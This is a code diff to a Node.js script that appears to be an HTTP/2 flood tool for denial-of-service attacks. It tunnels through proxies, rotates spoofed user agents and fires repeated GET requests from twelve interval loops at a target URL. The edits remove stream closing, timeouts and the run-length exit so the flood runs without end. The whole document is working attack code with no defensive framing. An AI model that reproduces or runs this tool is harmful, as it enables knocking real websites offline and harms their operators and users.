@@ -26,19 +26,19 @@ var parsed = url.parse(objetive);
     console.log('Fail to load target date.');
     process.exit();
 }
-const sigalgs = [
-    'ecdsa_secp256r1_sha256',
-    'ecdsa_secp384r1_sha384',
-    'ecdsa_secp521r1_sha512',
-    'rsa_pss_rsae_sha256',
-    'rsa_pss_rsae_sha384',
-    'rsa_pss_rsae_sha512',
-    'rsa_pkcs1_sha256',
-    'rsa_pkcs1_sha384',
-    'rsa_pkcs1_sha512',
- ];
+//const sigalgs = [
+    //'ecdsa_secp256r1_sha256',
+//'ecdsa_secp384r1_sha384',
+    //'ecdsa_secp521r1_sha512',
+    //'rsa_pss_rsae_sha256',
+   //'rsa_pss_rsae_sha384',
+    //'rsa_pss_rsae_sha512',
+    //'rsa_pkcs1_sha256',
+    //'rsa_pkcs1_sha384',
+    //'rsa_pkcs1_sha512',
+ //];
 
- let SignalsList = sigalgs.join(':');
+ // let SignalsList = sigalgs.join(':');
 
  try {
 var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
@@ -47,8 +47,8 @@ var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
  }
 class TlsBuilder {
     constructor (socket){
-        this.curve = "GREASE:X25519:x25519"; // Default
-        this.sigalgs = SignalsList;
+        //this.curve = "GREASE:X25519:x25519"; // Default
+        //this.sigalgs = SignalsList;
         this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_NO_TICKET|crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_COMPRESSION|crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_TLSEXT_PADDING|crypto.constants.SSL_OP_ALL|crypto.constants.SSLcom;
     }
 
@@ -57,7 +57,7 @@ class TlsBuilder {
 
     http2TUNNEL(socket){
         socket.setKeepAlive(true, 1000);
-        socket.setTimeout(10000);
+       // socket.setTimeout(10000);
         payload[":method"] = "GET";
         payload["Referer"] = objetive;
         payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
@@ -81,15 +81,15 @@ class TlsBuilder {
                 honorCipherOrder: true,
                 requestCert: true,
                 secureOptions: this.Opt, //"SSL_OP_ALL",
-                sigalgs: this.sigalgs,
+                 //sigalgs: this.sigalgs,
                 rejectUnauthorized: false,
-                ALPNProtocols: ['h2'],
+                 ALPNProtocols: ['h2'],
             }, () => {
                 
         for (let i = 0; i < 12; i++) {
 
             setInterval(async () => {
-                await tunnel.request(payload).close()
+                await tunnel.request(payload)
             });
         }
             })
@@ -110,13 +110,13 @@ proxy = proxy.split(':');
 var req = http.get({ 
         host: proxy[0],
         port: proxy[1],
-        timeout: 10000,
+      //  timeout: 10000,
         method: "CONNECT",
-        agent: keepAliveAgent,
+        // agent: keepAliveAgent,
 
         path: parsed.host + ":443"
         });
-        req.end();
+        //req.end();
     
         req.on('connect', (_, socket) =>  {
             BuildTLS.http2TUNNEL(socket);
@@ -131,9 +131,9 @@ var req = http.get({
 
 setInterval(Runner)
 
-setTimeout(function(){
-    process.exit();
-}, process.argv[3] * 1000);
+//setTimeout(function(){
+    //process.exit();
+//}, process.argv[3] * 1000);
 
 process.on('uncaughtException', function(er) {
 });
